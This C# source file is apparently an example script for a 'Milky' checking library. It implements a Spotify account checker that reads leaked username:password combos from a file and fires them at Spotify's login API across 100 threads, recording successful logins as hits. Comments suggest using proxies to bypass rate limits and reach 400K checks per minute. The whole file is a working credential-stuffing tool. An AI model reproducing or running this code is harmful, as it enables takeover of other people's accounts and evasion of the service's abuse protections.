using Milky.Enums;
using Milky.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Milky.Examples
{
    public class Spotify_Checker
    {
        private static readonly HttpClient _httpClient = new HttpClient(new HttpClientHandler { UseCookies = false });

        public static async Task Main()
        {
            var check = new MilkyCheck()
                .WithCombos(File.ReadAllLines("combos.txt").Select(combo => new Combo(combo)).ToList())
                .WithSettings(new CheckSettings
                {
                    Threads = 100,
                    OutputInConsole = true,
                    OutputInvalids = false
                })
                .WithCheckingProcess(async (combo, proxy) =>
                {
                    try
                    {
                        using var responseMessage1 = await _httpClient.GetAsync("https://accounts.spotify.com/en/login");

                        string csrfToken = Regex.Match(responseMessage1.Headers.ToString(), "csrf_token=(.*?);").Groups[1].Value; // Don't mind my way of parsing headers, it's a speed trick
                        if (csrfToken == string.Empty) return (CheckResult.Retry, null, true); // Use proxies if you want to bypass rate limit and reach up to 400K CPM (yes sir)

                        using var requestMessage2 = new HttpRequestMessage(HttpMethod.Post, "https://accounts.spotify.com/api/login")
                        {
                            Content = new FormUrlEncodedContent(new Dictionary<string, string>
                            {
                                { "username", combo.Username },
                                { "password", combo.Password },
                                { "csrf_token", csrfToken }
                            })
                        };

                        requestMessage2.Headers.TryAddWithoutValidation("Cookie", string.Join(";", $"csrf_token={csrfToken}", "__bon=MHwwfDB8MHwxfDF8MXwx"));
                        requestMessage2.Headers.TryAddWithoutValidation("User-Agent", "Mozilla");

                        using var responseMessage2 = await _httpClient.SendAsync(requestMessage2);

                        var contentString2 = await responseMessage2.Content.ReadAsStringAsync();

                        if (contentString2.Contains("errorInvalidCredentials"))
                        {
                            return (CheckResult.Invalid, null, false);
                        }
                        else if (!contentString2.Contains("displayName"))
                        {
                            return (CheckResult.Retry, null, true);
                        }

                        // Missing capture, will add later.

                        return (CheckResult.Hit, null, false);
                    }
                    catch
                    {
                        return (CheckResult.Retry, null, true);
                    }
                });

            var console = new MilkyConsole()
                .WithCheck(check)
                .WithMeta(new Meta
                {
                    Name = "Spotify Checker",
                    Version = "Example",
                    Author = "Laiteux"
                })
                .WithSettings(new ConsoleSettings
                {
                    ShowFree = false,
                    ShowPercentages = true
                })
                .WithRefreshDelay(TimeSpan.FromMilliseconds(100));

            _ = console.StartAsync();
            await check.StartAsync();

            await Task.Delay(-1);
        }
    }
}
